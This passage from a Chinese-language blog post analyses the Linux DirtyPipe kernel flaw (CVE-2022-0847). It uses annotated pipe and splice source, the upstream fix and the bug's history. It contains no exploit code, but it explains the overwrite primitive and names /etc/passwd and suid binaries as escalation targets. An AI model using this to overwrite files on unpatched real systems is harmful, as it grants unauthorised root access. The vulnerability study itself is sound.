mask];\t\t\t\n   \t\t\tbuf->page = page;\n   \t\t\tbuf->ops = &anon_pipe_buf_ops;\n   \t\t\tbuf->offset = 0;\n   \t\t\tbuf->len = 0;\n   \t\t\tif (is_packetized(filp))\t\t\t\n   \t\t\t\tbuf->flags = PIPE_BUF_FLAG_PACKET;\t\t\n   \t\t\telse\n   \t\t\t\tbuf->flags = PIPE_BUF_FLAG_CAN_MERGE;\t\t// 会进入该分支\n   \t\t\tpipe->tmp_page = NULL;\n   // ......\n   }\n   ```\n\n   \n\n2. 调用splice时，调用路径比较长，但最终会进入下面这个函数：\n\n   ```c\n   static size_t copy_page_to_iter_pipe(struct page *page, size_t offset, size_t bytes, struct iov_iter *i)\n   {\n   // ......\n   \tbuf = &pipe->bufs[i_head & p_mask];\n   // ......\n   \tbuf->ops = &page_cache_pipe_buf_ops;\n   \tget_page(page);\n   \tbuf->page = page;\t\t\t// 这个page是前序步骤中获得的文件page cache，直接给了管道的pipe_buffer->page。这里是“零拷贝”的精髓\n   \tbuf->offset = offset;\t\t\n   \tbuf->len = bytes;\t\t\t\t\n   // ......\n   }\n   ```\n\n   \n\n3. 第二次写pipe时，会使用上一步的page cache\n\n   ```c\n   static ssize_t pipe_write(struct kiocb *iocb, struct iov_iter *from)\n   {\n   // ......\n   \tif (chars && !was_empty) {\t\t\t\t// 由于splice设置了管道，当前管道非空，且需要写入的长度非0，于是会进入该分支\n   \t\t// ......\n   \t\tif ((buf->flags & PIPE_BUF_FLAG_CAN_MERGE) && offset + chars <= PAGE_SIZE) {\t// 满足条件\t\t\t\n   \t\t\t// ......\n   \t\t\tret = copy_page_from_iter(buf->page, offset, chars, from);\t\t\t// 直接就往page cache里写了\n   \t\t\t// ......\n   \t}\n   // ......\n   }\n   ```\n\n   \n\n需要注意的是，由于第二步splice时，参数len（对应bytes）至少为1，所以利用漏洞写的时候，开始的那1个字节是无法覆盖的。\n\n管道相关操作的详细内核代码流程，可以参考下一小节的分析。\n\n## 内核代码分析\n\n抽象层面，我们认为管道就是一个buffer，一端（fd[0]）读，另一端（fd[1]）写。\n\n对应到内核代码实现，管道实际是由1~16个page组成的，每个page通过`struct pipe_buffer`管理，而16个`struct pipe_buffer`又通过一个`struct pipe_inode_info`进行管理。抽象出如下图所示的结构，管道的数据实际存放在最下层的物理页面中。\n\n![image-20230507234844419](image-20230507234844419.png?size=600)\n\n看代码时明白了一些点，怕之后忘记需要重看代码（费时间），所以记录一下。当往管道中写入数据时：\n\n- 如果创建pipe时flags中没有O_DIRECT，pipe_buffer->flags就会被赋值为PIPE_BUF_FLAG_CAN_MERGE。那么前后多次写入pipe的数据，内核在处理时可以将它们合并到1个page中存储（要求这些数据总长度<= 1 PAGESIZE）\n\n- 如果创建pipe时flags中有O_DIRECT，那么一次写入的数据，必须自己占一个page（不管是否写满），不跟前后写入的数据合并\n\n- 在读的时候也一样，不带O_DIRECT标志的，page内容全部读完了才释放空间。带O_DIRECT标志的，不管这次读走了多少，都要释放空间\n\n- 调用write往pipe写的时候，一次最多只能写一个PAGESIZE，即4096字节\n\n- 一个pipe管道最多能写16*4096=65535字节数（默认，可通过 `fcntl()` 设置），再写就会阻塞，直到有人读出\n\n  \n\n### 创建pipe\n\n创建pipe，即建立管道，涉及两个主要结构体创建（空间分配）：`struct pipe_inode_info`和`struct pipe_buffer`。\n\n```c\n#define PIPE_DEF_BUFFERS\t16\n\nstruct pipe_inode_info *alloc_pipe_info(void)\n{\n\tunsigned long pipe_bufs = PIPE_DEF_BUFFERS;\n\t// ......\n    /*申请一个pipe_inode_info，用于管理管道*/\n\tpipe = kzalloc(sizeof(struct pipe_inode_info), GFP_KERNEL_ACCOUNT);\n\t// ......\n    /*申请16个pipe_buffer，形成环形缓冲区，用于管理16个管道页*/\n\tpipe->bufs = kcalloc(pipe_bufs, sizeof(struct pipe_buffer), GFP_KERNEL_ACCOUNT);\n\t// ......\n}\n```\n\n`struct pipe_inode_info`结构体（linux5.15版本）中各成员的含义如下：\n\n```c\nstruct pipe_inode_info {\n\tstruct mutex mutex;\n\twait_queue_head_t rd_wait, wr_wait;\t\t// 等待队列，存储正在等待的可读或可写的进程\n\tunsigned int head;\t\t// 写管道头（production），当向管道写入数据时从该位置开始写入\n\tunsigned int tail;\t\t// 读管道头（consumption），当从管道读取数据时从该位置开始读取\n\tunsigned int max_usage;\t\t// pipe ring中可使用的slots的最大数量，一般为0x10\n\tunsigned int ring_size;\t\t// pipe ring的环形大小，一般为0x10\n#ifdef CONFIG_WATCH_QUEUE\n\tbool note_loss;\n#endif\n\tunsigned int nr_accounted;\n\tunsigned int readers;\t\t// 正在读取管道的进程数\n\tunsigned int writers;\t\t// 正在写入管道的进程数\n\tunsigned int files;\n\tunsigned int r_counter;\n\tunsigned int w_counter;\n\tunsigned int poll_usage;\n\tstruct page *tmp_page;\n\tstruct fasync_struct *fasync_readers;\n\tstruct fasync_struct *fasync_writers;\n\tstruct pipe_buffer *bufs;\t\t// 环形缓冲区，由16个pipe_buffer对象组成，每个pipe_buffer对象管理一个内存页\n\tstruct user_struct *user;\t\t// 创建该pipe的用户\n#ifdef CONFIG_WATCH_QUEUE\n\tstruct watch_queue *watch_queue;\n#endif\n};\n```\n\n`struct pipe_buffer`结构体（linux5.15版本）中各成员的含义如下：\n\n```c\nstruct pipe_buffer {\n\tstruct page *page;\t\t\t// 存放数据的内存页\n\tunsigned int offset, len;\t\t// 二者共同组成当前page可读的范围\n\tconst struct pipe_buf_operations *ops;\t\t// 可以对该buffer进行的一些操作\n\tunsigned int flags;\t\t\t// 当前buffer的标志\n\tunsigned long private;\n};\n```\n\n\n\n### 写pipe\n\n```c\nstatic ssize_t\npipe_write(struct kiocb *iocb, struct iov_iter *from)\n{\n\tstruct file *filp = iocb->ki_filp;\n\tstruct pipe_inode_info *pipe = filp->private_data;\t\t\t// 获取管道的管理结构pipe_inode_info\n\t// ......\n\tsize_t total_len = iov_iter_count(from);\t\t\t\t\t// 需要写入的长度\n\tssize_t chars;\n\t// ......\n\thead = pipe->head;\n\twas_empty = pipe_empty(head, pipe->tail);\n\tchars = total_len & (PAGE_SIZE-1);\n\tif (chars && !was_empty) {\t\t\t// 待写入长度非0，且管道非空，先检查一下上一个buffer的条件\n\t\tunsigned int mask = pipe->ring_size - 1;\n\t\tstruct pipe_buffer *buf = &pipe->bufs[(head - 1) & mask];\t\t// 取上一个buffer，因为上一个可能还有空闲空间，而当前head指向的buffer需要新申请\n\t\tint offset = buf->offset + buf->len;\n\n\t\tif ((buf->flags & PIPE_BUF_FLAG_CAN_MERGE) &&\n\t\t    offset + chars <= PAGE_SIZE) {\t\t\t\t// 如果上一个buffer允许merge，且剩余空间够存储本次的数据，则写到此处\n            // ......\n\t\t\tret = copy_page_from_iter(buf->page, offset, chars, from);\n\t\t\t// ......\n\t\t\tbuf->len += ret;\n\t\t\tif (!iov_iter_count(from))\t\t\t// 如果剩余待拷贝的长度为0，则跳转到out退出\n\t\t\t\tgoto out;\n\t\t}\n\t}\n\n\tfor (;;) {\t\t\t\t\t// 如果剩余写入空间不足，需要新申请一个page（也称做slot？）\n\t\t// ......\n\t\thead = pipe->head;\n\t\tif (!pipe_full(head, pipe->tail, pipe->max_usage)) {\t\t// 如果管道没满\n\t\t\tunsigned int mask = pipe->ring_size - 1;\n\t\t\tstruct pipe_buffer *buf = &pipe->bufs[head & mask];\t\t// 取head对应的pipe_buffer\n\t\t\tstruct page *page = pipe->tmp_page;\n\t\t\tint copied;\n\n\t\t\tif (!page) {\n\t\t\t\tpage = alloc_page(GFP_HIGHUSER | __GFP_ACCOUNT);\t// 先申请一个page（也叫做一个slot），即使此次未使用，下次也还可以用\n\t\t\t\t// ......\n\t\t\t}\n\t\t\t// ......\n\t\t\tpipe->head = head + 1;\t\t\t\t\t// slot已申请完毕，让写管道头head指向下一个序号\n\t\t\tbuf = &pipe->bufs[head & mask];\t\t\t// 当前slot的管理结构pipe_buffer\n\t\t\tbuf->page = page;\t\t\t\t\t\t// 将刚刚申请的page连接接到pipe_buffer\n\t\t\tbuf->ops = &anon_pipe_buf_ops;\n\t\t\tbuf->offset = 0;\n\t\t\tbuf->len = 0;\n\t\t\tif (is_packetized(filp))\t\t\t// 判断pipe创建时是否指定了O_DIRECT（即packet mode）\n\t\t\t\tbuf->flags = PIPE_BUF_FLAG_PACKET;\t\t// 是packet mode\t\n\t\t\telse\n\t\t\t\tbuf->flags = PIPE_BUF_FLAG_CAN_MERGE;\t\t// 非packet mode，则将pipe_buffer的flags加上该标志，表示允许merge\n\t\t\tpipe->tmp_page = NULL;\n\n\t\t\tcopied = copy_page_from_iter(page, 0, PAGE_SIZE, from);\t\t// 拷贝数据\n\t\t\t// ......\n\t\t\tret += copied;\n\t\t\tbuf->offset = 0;\n\t\t\tbuf->len = copied;\n\n\t\t\tif (!iov_iter_count(from))\n\t\t\t\tbreak;\t\t\t\t\t\t// 用户态数据全都写完了，则break\n\t\t}\n\t\t// ......\n\t}\nout:\n\tif (pipe_full(pipe->head, pipe->tail, pipe->max_usage))\n\t\twake_next_writer = false;\n\t// ......\n\tif (was_empty || pipe->poll_usage)\t\t\t// 如果一开始管道为空，写完后管道非空了，可以唤醒读进程\n\t\twake_up_interruptible_sync_poll(&pipe->rd_wait, EPOLLIN | EPOLLRDNORM);\n\tkill_fasync(&pipe->fasync_readers, SIGIO, POLL_IN);\n\tif (wake_next_writer)\t\t\t// 如果管道没满，可以唤醒写进程\n\t\twake_up_interruptible_sync_poll(&pipe->wr_wait, EPOLLOUT | EPOLLWRNORM);\n\t// ......\n\treturn ret;\n}\n```\n\n\n\n### 读pipe\n\n```c\nstatic ssize_t\npipe_read(struct kiocb *iocb, struct iov_iter *to)\n{\n\tsize_t total_len = iov_iter_count(to);\t\t\t\t// 需要读取的长度\n\tstruct file *filp = iocb->ki_filp;\n\tstruct pipe_inode_info *pipe = filp->private_data;\t\t// 取出当前管道的管理结构pipe_inode_info\n\t// ......\n\twas_full = pipe_full(pipe->head, pipe->tail, pipe->max_usage);\t// 判断管道是否已满，是的话在读完后需要唤醒等待写管道的进程\n\tfor (;;) {\n\t\tunsigned int head = pipe->head;\n\t\tunsigned int tail = pipe->tail;\n\t\tunsigned int mask = pipe->ring_size - 1;\n\n\t\tif (!pipe_empty(head, tail)) {\t\t\t\t// 判断当前管道是否非空\n\t\t\tstruct pipe_buffer *buf = &pipe->bufs[tail & mask];\t// 根据读管道头tail，选择对应的pipe_buffer结构体\n\t\t\tsize_t chars = buf->len;\t\t// 当前管道页可读的总长度\n\t\t\t// ......\n\t\t\tif (chars > total_len) {\t\t\t\n\t\t\t\t// ......\n\t\t\t\tchars = total_len;\t\t\t// 如果管道页中，可读取的长度chars大于需要读取的长度total_len\n\t\t\t}\n\t\t\t// ......\n\t\t\twritten = copy_page_to_iter(buf->page, buf->offset, chars, to);\t// 数据拷贝\n\t\t\t// ......\n\t\t\tret += chars;\n\t\t\tbuf->offset += chars;\n\t\t\tbuf->len -= chars;\t\t\t\t// 读完之后，pipe_buffer的offset和len都要更改\n\t\t\t// ......\n\t\t\tif (!buf->len) {\t\t\t\t// 当管道页可读取长度剩余0时，释放该页，让管道头tail指向下一个序号\n\t\t\t\tpipe_buf_release(pipe, buf);\n\t\t\t\t// ......\n\t\t\t\ttail++;\n\t\t\t\tpipe->tail = tail;\n                // ......\n\t\t\t}\n\t\t\ttotal_len -= chars;\n\t\t\tif (!total_len)\t\t\n\t\t\t\tbreak;\t/* common path: read succeeded */\n\t\t\tif (!pipe_empty(head, tail))\t\n\t\t\t\tcontinue;\t\t// 该管道页已读完，但还未读到totoal_len长度数据，且管道非空，则继续读下一个管道页\n\t\t}\n\t\t// ......\n\t}\n\tif (pipe_empty(pipe->head, pipe->tail))\n\t\twake_next_reader = false;\n\t__pipe_unlock(pipe);\n\n\tif (was_full)\t\t\t\t// 读之前管道已满，读之后管道空出了一些，所以可唤醒写进程\n\t\twake_up_interruptible_sync_poll(&pipe->wr_wait, EPOLLOUT | EPOLLWRNORM);\n\tif (wake_next_reader)\t\t// 管道非空，则唤醒下一个读进程\n\t\twake_up_interruptible_sync_poll(&pipe->rd_wait, EPOLLIN | EPOLLRDNORM);\n\t// ......\n\treturn ret;\t\t// 返回已读取字节数\n}\n```\n\n另外，`pipe_buf_release()`的时候有一个优化，当pipe_buffer使用的page只有一个引用，且`pipe_inode_info->tmp_page`为空时，会将这个page给tmp_page。这样需要下一个写请求的时候，若空间不够就无需再申请page。\n\n```c\nstatic inline void pipe_buf_release(struct pipe_inode_info *pipe,\n\t\t\t\t    struct pipe_buffer *buf)\n{\n\tconst struct pipe_buf_operations *ops = buf->ops;\n\n\tbuf->ops = NULL;\n\tops->release(pipe, buf);\n}\n\nstatic void anon_pipe_buf_release(struct pipe_inode_info *pipe,\n\t\t\t\t  struct pipe_buffer *buf)\n{\n\tstruct page *page = buf->page;\n\n\t/*\n\t * If nobody else uses this page, and we don't already have a\n\t * temporary page, let's keep track of it as a one-deep\n\t * allocation cache. (Otherwise just release our reference to it)\n\t */\n\tif (page_count(page) == 1 && !pipe->tmp_page)\n\t\tpipe->tmp_page = page;\n\telse\n\t\tput_page(page);\t\t// put_page后，page依然挂在pipe_buffer->page中。不过此时offset为0x1000，len为0，根据函数逻辑这个page不会再被用到，不会有什么问题\n}\n```\n\n\n\n### splice操作\n\nsplice在内核中的函数调用路径如下：\n\n```c\nSYSCALL_DEFINE6(splice, int, fd_in, loff_t __user *, off_in, int, fd_out, loff_t __user *, off_out, size_t, len, unsigned int, flags);\n// ⬇\n__do_splice(in.file, off_in, out.file, off_out, len, flags);\n// ⬇\ndo_splice(in, __off_in, out, __off_out, len, flags);\n```\n\n`do_splice()`中分三种情况\n\n```c\nlong do_splice(struct file *in, loff_t *off_in, struct file *out,\n\t       loff_t *off_out, size_t len, unsigned int flags)\n{\n    // ...... \n\tipipe = get_pipe_info(in, true);\n\topipe = get_pipe_info(out, true);\t\t// 通过文件描述符获取pipe信息\n\n\tif (ipipe && opipe) {\t\t\t\t\t// 1. 当in和out都是pipe类型\n\t\t// ......\n\t\treturn splice_pipe_to_pipe(ipipe, opipe, len, flags);\n\t}\n\n\tif (ipipe) {\t\t\t\t\t\t\t// 2. 当只有in是pipe类型\n\t\t// ......\n\t\tret = do_splice_from(ipipe, out, &offset, len, flags);\n\t\t// ......\n\t\tif (!off_out)\n\t\t\tout->f_pos = offset;\n\t\telse\n\t\t\t*off_out = offset;\t\t\t// 不会影响原文件的f_pos\n\t\treturn ret;\n\t}\n\n\tif (opipe) {\t\t\t\t\t\t\t// 3. 当只有out是pipe类型\n\t\t// ......\n\t\tif (off_in) {\t\t\t\t\t\t// 判断off_in是否有值\n\t\t\tif (!(in->f_mode & FMODE_PREAD))\t// 判断in->f_mode是否可读（文件打开模式中是否有可读标志）\n\t\t\t\treturn -EINVAL;\n\t\t\toffset = *off_in;\t\t\t\t// 如果off_in有值，且in->f_mode可读，则取off_in中的值当作读的偏移值\n\t\t} else {\n\t\t\toffset = in->f_pos;\t\t\t\t// 如果off_in为空，则使用in->f_pos作为读的偏移值\n\t\t}\n\t\t// ......\n\t\tret = splice_file_to_pipe(in, opipe, &offset, len, flags);\n\t\tif (!off_in)\n\t\t\tin->f_pos = offset;\n\t\telse\n\t\t\t*off_in = offset;\t\t\t//调用splice时，如果给非pipe fd搭配了off_xx参数，那么splice不会影响原文件的f_pos\n\n\t\treturn ret;\n\t}\n```\n\n这里我们只需关注最后一种out是pipe类型的情况，即`splice_file_to_pipe()`的调用路径\n\n```c\nsplice_file_to_pipe(in, opipe, &offset, len, flags);\n// ⬇\ndo_splice_to(in, offset, opipe, len, flags);\n// ⬇\nin->f_op->splice_read(in, ppos, pipe, len, flags);\n```\n\n![image-20230506193531161](image-20230506193531161.png?size=600)\n\nvscode+gdb调试结果显示，in->f_op->splice_read对应到`generic_file_splice_read()`\n\n```c\nssize_t generic_file_splice_read(struct file *in, loff_t *ppos,\n\t\t\t\t struct pipe_inode_info *pipe, size_t len,\n\t\t\t\t unsigned int flags)\n{\n    // ......\n\tiov_iter_pipe(&to, READ, pipe, len);\t\t\t// 初始化to，用于后续读写操作\n\tinit_sync_kiocb(&kiocb, in);\t\t\t\t\t// 用in初始化kiocb\n\tkiocb.ki_pos = *ppos;\t\t\t\t\t\t\t// 用户态参数*off_in初始化kiocb.ki_pos\n\tret = call_read_iter(in, &kiocb, &to);\n\t// ......\n\treturn ret;\n}\n\nstatic inline ssize_t call_read_iter(struct file *file, struct kiocb *kio,\n\t\t\t\t     struct iov_iter *iter)\n{\n\treturn file->f_op->read_iter(kio, iter);\n}\n```\n\nfile->f_op->read_iter对应到`generic_file_read_iter()`\n\n```c\nssize_t generic_file_read_iter(struct kiocb *iocb, struct iov_iter *iter)\t\t\n{\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\n\t// ......\n\treturn filemap_read(iocb, iter, retval);\n}\n// 读取 kiocb->ki_filp 文件 kiocb->ki_pos 偏移起始处的数据，保存到 iter 描述的用户态缓存中，iter->count 描述需要读取的数据量\n```\n\n然后\n\n```c\nssize_t filemap_read(struct kiocb *iocb, struct iov_iter *iter,\n\t\tssize_t already_read)\n{\n\tstruct file *filp = iocb->ki_filp;\n\tstruct file_ra_state *ra = &filp->f_ra;\n\tstruct address_space *mapping = filp->f_mapping;\n\tstruct inode *inode = mapping->host;\n\t// ......\n\tiov_iter_truncate(iter, inode->i_sb->s_maxbytes);\n\tpagevec_init(&pvec);\n\n\tdo {\n\t\t// ......\n\t\terror = filemap_get_pages(iocb, iter, &pvec);\t// ***在文件page cache中寻找当前操作的文件区间[@pos, @pos+@count)对应的 buffer page，当 page cache 中尚不存在对应的buffer page 时，则分配一个新的 buffer page\n\n\t\tisize = i_size_read(inode);\t\t\t\t// inode对应的文件大小\n\t\tend_offset = min_t(loff_t, isize, iocb->ki_pos + iter->count);\t// 计算读取请求的结束位置\n\t\t// ......\n\t\tfor (i = 0; i < pagevec_count(&pvec); i++) {\n\t\t\tstruct page *page = pvec.pages[i];\t\t\t// 上文中filemap_get_pages()中获得的页面\n\t\t\tsize_t page_size = thp_size(page);\n\t\t\tsize_t offset = iocb->ki_pos & (page_size - 1);\t\t\t// 用户态传入的*off_in\n\t\t\tsize_t bytes = min_t(loff_t, end_offset - iocb->ki_pos, page_size - offset); // 计算应当读取的文件长度\n\t\t\t// ......\n\t\t\tcopied = copy_page_to_iter(page, offset, bytes, iter);\t\t// ***执行拷贝操作\n\n\t\t\talready_read += copied;\t\t// 已拷贝的长度\n\t\t\tiocb->ki_pos += copied;\t\t// 改变iocb中的偏移量\n            // ......\n\t\t}\n\t\t// ......\n\t} while (iov_iter_count(iter) && iocb->ki_pos < isize && !error);\n\t// ......\n\treturn already_read ? already_read : error;\n}\n```\n\n再分别看一下`filemap_get_pages()`和`copy_page_to_iter()`函数:\n\n1. 首先是`filemap_get_pages()`\n\n   ```c\n   static int filemap_get_pages(struct kiocb *iocb, struct iov_iter *iter,\n   \t\tstruct pagevec *pvec)\n   {\n   \tstruct file *filp = iocb->ki_filp;\n   \tstruct address_space *mapping = filp->f_mapping;\n   \tpgoff_t index = iocb->ki_pos >> PAGE_SHIFT;\t\t\t// 读文件的起点偏移对应在第几个page\n       // ......\n   \tlast_index = DIV_ROUND_UP(iocb->ki_pos + iter->count, PAGE_SIZE);\t\t\t// 读文件的终点偏移对应在第几个page\n   retry:\n   \tfilemap_get_read_batch(mapping, index, last_index, pvec);\t\t\t// 找到对应的page cache\n   \tif (!pagevec_count(pvec)) {\t\t\t\t// 如果没有，说明不在页缓存中，那么就同步地去读 \n   \t\t// ......\n   \t\tpage_cache_sync_readahead(mapping, ra, filp, index, last_index - index);\n   \t\tfilemap_get_read_batch(mapping, index, last_index, pvec);\t\n   \t}\n   \tif (!pagevec_count(pvec)) {\t\t\t\t// 如果还找不到，就创建新的page cache。一次创建一个页的大小\n   \t\t// ......\n   \t\terr = filemap_create_page(filp, mapping, iocb->ki_pos >> PAGE_SHIFT, pvec);\t\t\n   \t\tif (err == AOP_TRUNCATED_PAGE)\n   \t\t\tgoto retry;\n   \t\treturn err;\n   \t}\n   \t// ......\n   \treturn err;\n   }\n   ```\n\n   \n\n2. 然后是`copy_page_to_iter()`\n\n   ```c\n   copy_page_to_iter(page, offset, bytes, iter);\n   // ⬇\n   __copy_page_to_iter(page, offset, min(bytes, (size_t)PAGE_SIZE - offset), i);\n   // ⬇\n   static size_t __copy_page_to_iter(struct page *page, size_t offset, size_t bytes,\n   \t\t\t struct iov_iter *i)\n   {\n   \t// ......\n   \tif (iov_iter_is_pipe(i))\t\t// splice中将iter_type设置成了ITER_PIPE\n   \t\treturn copy_page_to_iter_pipe(page, offset, bytes, i);\t\t\n   \t// ......\n   \treturn 0;\n   }\n   // ⬇\n   static size_t copy_page_to_iter_pipe(struct page *page, size_t offset, size_t bytes,\n   \t\t\t struct iov_iter *i)\n   {\n   \tstruct pipe_inode_info *pipe = i->pipe;\n   \tstruct pipe_buffer *buf;\n   \tunsigned int p_tail = pipe->tail;\n   \tunsigned int p_mask = pipe->ring_size - 1;\n   \tunsigned int i_head = i->head;\n   \tsize_t off;\n   \n   \tif (unlikely(bytes > i->count))\n   \t\tbytes = i->count;\n   \n   \tif (unlikely(!bytes))\t\t\t// 调用splice时，用户态传入的len不能为0\n   \t\treturn 0;\n   \t// ......\n   \tbuf->ops = &page_cache_pipe_buf_ops;\n   \tget_page(page);\t\t\t// 让page的_count加一，以防在处理page的时候该page被内核释放掉\n   \tbuf->page = page;\t\t// ***直接把page cache对应的物理页面给了pipe_buffer中的page成员\n   \tbuf->offset = offset;\t\t\t\n   \tbuf->len = bytes;\t\t// offset和bytes共同标记该slot可读取的范围\n   \t// ......\n   \ti->count -= bytes;\n   \treturn bytes;\n   }\n   ```\n\n   \n\n简单来说，就是splice直接把page cache给到了`pipe_buffer->page`，省去了用户态访问文件时需要来回拷贝的麻烦，提升了效率。如下图所示：\n\n\n\n![image-20230508000125542](image-20230508000125542.png?size=600)\n\n正常情况下，没有PIPE_BUF_FLAG_CAN_MERGE标记的话，这个pipe_buffer指向的page是只会被读取的，无法进行写入操作。\n\n但是，由于`copy_page_to_iter_pipe()`函数中，忘记对`buf->flags`做初始化，默认以为它是0，导致了漏洞的发生。\n\n\n\n# 漏洞修复\n\npatch: [lib/iov_iter: initialize \"flags\" in new pipe_buffer](https://lore.kernel.org/lkml/20220221100313.1504449-1-max.kellermann@ionos.com/)\n\n```diff\n---\n lib/iov_iter.c | 2 ++\n 1 file changed, 2 insertions(+)\n\ndiff --git a/lib/iov_iter.c b/lib/iov_iter.c\nindex b0e0acdf96c1..6dd5330f7a99 100644\n--- a/lib/iov_iter.c\n+++ b/lib/iov_iter.c\n@@ -414,6 +414,7 @@ static size_t copy_page_to_iter_pipe(struct page *page, size_t offset, size_t by\n \t\treturn 0;\n \n \tbuf->ops = &page_cache_pipe_buf_ops;\n+\tbuf->flags = 0;\n \tget_page(page);\n \tbuf->page = page;\n \tbuf->offset = offset;\n@@ -577,6 +578,7 @@ static size_t push_pipe(struct iov_iter *i, size_t size,\n \t\t\tbreak;\n \n \t\tbuf->ops = &default_pipe_buf_ops;\n+\t\tbuf->flags = 0;\n \t\tbuf->page = page;\n \t\tbuf->offset = 0;\n \t\tbuf->len = min_t(ssize_t, left, PAGE_SIZE);\n-- \n```\n\n除了poc涉及的`copy_page_to_iter_pipe()`函数，漏洞补丁还在`push_pipe()`中对pipe_buffer->flags做了初始化操作。\n\n（跟dirtycow一样简单的两行patch，跟dirtycow一样可以写任意只读文件，这两个洞实在是太强了）\n\n\n\n# 漏洞利用\n\n## poc验证\n\npoc验证较简单，利用qemu搭建linux5.15的环境，很快就出结果了（这点比dirtycow好用，不需要竞争，可惜能用dirtypipe打的版本不多）。\n\n![image-20230508002043475](image-20230508002043475.png?size=600)\n\n两个小瑕疵：\n\n1. 第一个字节无法覆盖。\n\n2. 无法持久化。重启后文件恢复未被更改的状态，除非有其他有权限进程改了该文件，让其变为dirty，我们利用dirtypipe的更改才会被写回到磁盘中，否则只能改pagecache中的内容。不过以基于此也足够提权利用了。\n\n\n## 提权利用\n\n在x86 linux上进一步的提权利用跟dirtycow类似，找一些特殊文件如/etc/passwd，或带suid位的可执行程序，或者公用的库函数之类的，利用dirtypipe将文件内容改掉达到提权目的。\n\npoc已经把主体框架搭完了，剩下的工作感觉有点重复，这里就先略过。后面有需要再补上。\n\n\n\n# 知识点\n\n## pipe\n\n管道是一个单向的数据通道，用于进程间通信。\n\nlinux系统上，用于创建管道的系统调用有两个：pipe和pipe2，它们的区别仅在于pipe2多了一个flags参数（当flags为0时，pipe2和pipe等价）。对应libc封装函数的定义如下：\n\n```c\n#include <unistd.h>\nint pipe(int pipefd[2]);\n\n#include <fcntl.h>              /* Definition of O_* constants */\n#include <unistd.h>\nint pipe2(int pipefd[2], int flags);\n```\n\n返回的数组`pipefd[2]`表示管道的两端，`pipefd[0]`是读端，`pipefd[1]`是写端，写入的数据会在内核中缓存。\n\n\n\n## splice\n\nsplice是零拷贝在管道（pipe）上的一种实现，它针对两个文件描述符进行数据搬运操作，无需将数据从内核态拷贝到用户态，而后再拷贝回内核。它在libc中的封装函数定义如下：\n\n```c\n#define _GNU_SOURCE         /* See feature_test_macros(7) */\n#include <fcntl.h>\n\nssize_t splice(int fd_in, off64_t *off_in, int fd_out, off64_t *off_out, size_t len, unsigned int flags);\n```\n\n表示从`fd_in`（偏移`*off_in`的位置）移动`len`字节数据到`fd_out`，有个条件是`fd_in`和`fd_out`至少有一个是pipe建立的文件描述符（对应的off_in和off_out必须设置成NULL）。所以这里有三种情况，in和out都是pipe，in是pipe而out不是，in不是而out是pipe，三者在代码中的处理过程是不一样的。\n\n\n# 背后的故事\n\n## 漏洞发现\n\n作者Max Kellermann在[他的博客](https://dirtypipe.cm4all.com/)中详细记录了这个漏洞的发现过程。\n\n2021年4月份作者第一次收到文件损毁的工单（貌似他并不是专业安全研究员），大半年的时间里一步一坑从应用层逐渐探索到内核层，终于在2022年2月确认问题根因是一个linux内核漏洞。\n\n文章的字里行间透露出过程中的困惑和不可思议，着实佩服作者探索本质的勇气和坚持。\n\n![953c7c7aly1hds5fdmz6nj21mc17sqsa.jpg](953c7c7aly1hds5fdmz6nj21mc17sqsa.jpg?size=600)\n\n这种类型的漏洞不好发现，不像多数内存洞会有很直观的反应（崩溃/死机/重启），它的影响仅仅是改变了磁盘文件的某些字节，即使发生了也很难察觉。但这种漏洞却很好用，无需一步步在内核中构造ROP、绕过各种安全措施再回到用户态获得root shell，它直接在应用层面改一些特殊文件即可达到提权目的（从容又稳定）。\n\n## 代码历史\n\n> 参考 [Linux 内核提权 DirtyPipe（CVE-2022-0847）漏洞分析](https://www.anquanke.com/post/id/270067)\n\nsplice系统调用代码演进历程：\n\n- **linux 2.6**：引入splice系统调用\n\n  patch: [Introduce sys_splice() system call](https://github.com/torvalds/linux/commit/5274f052e7b3dbd81935772eb551dfd0325dfa9d)\n\n- **linux 4.9**：添加iov_iter对pipe的支持\n\n  patch: [new iov_iter flavour: pipe-backed](https://github.com/torvalds/linux/commit/241699cd72a8489c9446ae3910ddd243e9b9061b)\n\n  从这个版本开始，出现了`copy_page_to_iter_pipe()`和`push_pipe()`，而这两个函数中缺少对`pipe_buffer->flags`的初始化操作。不过此时flags还没有merge属性，因此无影响。\n\n- **linux 5.1**：删除pipe_buffer_operations中的can_merge成员\n\n  patch: [pipe: stop using ->can_merge](https://github.com/torvalds/linux/commit/01e7187b41191376cee8bea8de9f907b001e87b4)\n\n  `pipe_write()`中使用`pipe_buf_can_merge()`函数检查区分不同的pipe_buffer，只允许注册了`anon_pipe_buf_ops`的pipe_buffer通过检查\n\n  ```c\n  static ssize_t\n  pipe_write(struct kiocb *iocb, struct iov_iter *from)\n  {\n  \t// ......\n  \t\tif (pipe_buf_can_merge(buf) && offset + chars <= PAGE_SIZE) {\n  \t\t\tret = pipe_buf_confirm(pipe, buf);\n  \t\t\tif (ret)\n  \t\t\t\tgoto out;\n              \n  \t\t\tret = copy_page_from_iter(buf->page, offset, chars, from);\n  \t\t\t// ......\n  }\n  \n  static bool pipe_buf_can_merge(struct pipe_buffer *buf)\n  {\n  \treturn buf->ops == &anon_pipe_buf_ops;\n  }\n  ```\n\n- **linux 5.8**：合并各种类型pipe_buffer_operations，新增`PIPE_BUF_FLAG_CAN_MERGE`属性\n\n  patch: [pipe: merge anon_pipe_buf*_ops](https://github.com/torvalds/linux/commit/f6dd975583bd8ce088400648fd9819e4691c8958)\n\n  此版本合并了各种类型的pipe_buffer_operations（因为都一样，没必要重复定义），对pipe_buffer中flags成员，新增`PIPE_BUF_FLAG_CAN_MERGE`属性。\n\n  由于自linux 4.9以来，flags在`copy_page_to_iter_pipe()`和`push_pipe()`中未初始化，所以新增的这个属性就导致了漏洞的发生。\n\n  \n\n\n# 参考文章\n\n[The Dirty Pipe Vulnerability](https://dirtypipe.cm4all.com/)\n\n[DirtyPipe（CVE-2022-0847）漏洞分析](https://www.freebuf.com/vuls/353783.html)\n\n[终端安全 | DirtyPipe（CVE-2022-0847）漏洞分析](https://www.freebuf.com/vuls/335382.html)\n\n[Linux 的进程间通信：管道](https://zhuanlan.zhihu.com/p/58489873)\n\n[看一遍就理解：零拷贝详解](https://heapdump.cn/article/3290793)\n\n[linux网络编程九：splice函数，高效的零拷贝](https://blog.csdn.net/jasonliuvip/article/details/22600569)\n\n[LINUX系统调用SENDFILE和SPLICE简单分析](http://www.0x55aa.com/linux/1786.html)\n\n[图解 | Linux进程通信 - 管道实现](https://cloud.tencent.com/developer/article/1890707)\n\n[O_DIRECT - Linux 直接I/O 